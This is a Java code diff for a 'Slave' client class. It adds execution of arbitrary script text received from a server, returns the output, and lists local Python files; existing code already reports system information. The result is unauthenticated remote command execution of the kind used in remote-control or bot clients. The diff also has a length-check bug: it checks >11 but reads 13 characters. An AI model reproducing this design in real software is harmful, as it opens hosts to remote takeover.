@@ -111,9 +111,15 @@ public class Slave implements Runnable {
             sendMessage(handler.returnSystemInfo());
             folderInfo.createFolder("Haleluia");
         }
-        if (msg.equals("server:script"))
+        if (msg.length()>11)
+        if (msg.substring(0,13).equals("server:script"))
+        {   try {
+            sendMessage("ScriptResults:" + handler.runScript(msg.substring(13)));
+        }
+        catch (Exception ex)
         {
-            sendMessage(handler.runScript("dd"));
+            sendMessage("ScriptResults:" + ex.toString());
+        }
         }
 
         if(msg.equals("server:2"))
@@ -156,6 +162,14 @@ public class Slave implements Runnable {
             String xmlToSend = xmlCreator.sendOsInfo(new ArrayList<String>(), systemInfo.getPcName(), systemInfo.getOs());
 
             sendMessage(xmlToSend);
+        }
+
+        if(msg.contains("AvailablePythonScripts"))
+        {
+            ArrayList<File> pythonFiles = folderInfo.getAllFilesWithExtension("py");
+            XMLCreator xmlCreator = new XMLCreator(folderInfo);
+            String xmlPythonFiles =  xmlCreator.createAvailablePythonScript(pythonFiles);
+            sendMessage(xmlPythonFiles);
         }
 
 
